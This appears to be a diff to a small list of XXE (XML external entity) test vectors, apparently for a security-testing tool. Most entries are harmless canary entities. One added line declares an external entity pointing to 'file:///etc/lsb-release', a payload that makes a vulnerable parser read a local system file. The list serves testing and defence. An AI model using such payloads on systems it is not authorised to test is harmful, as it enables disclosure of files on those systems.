@@ -1,2 +1,3 @@
-{"vector":"<!DOCTYPE docem [<!ENTITY xxe_canary \"XXE_STRING\">]>","reference":"&xxe_canary;"}
-{"vector":"<!DOCTYPE docem [<!ENTITY xxe_canary \"XXE_STRING\">]>","reference":""}
+{"vector":"<!DOCTYPE docem [<!ENTITY xxe_test \"XXE_STRING\">]>","reference":""}
+{"vector":"<!DOCTYPE docem [<!ENTITY xxe_canary_0 \"XXE_STRING\">]>","reference":"&xxe_canary_0;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_2 SYSTEM \"file:///etc/lsb-release\">]>","reference":"&xxe_canary_2;"}
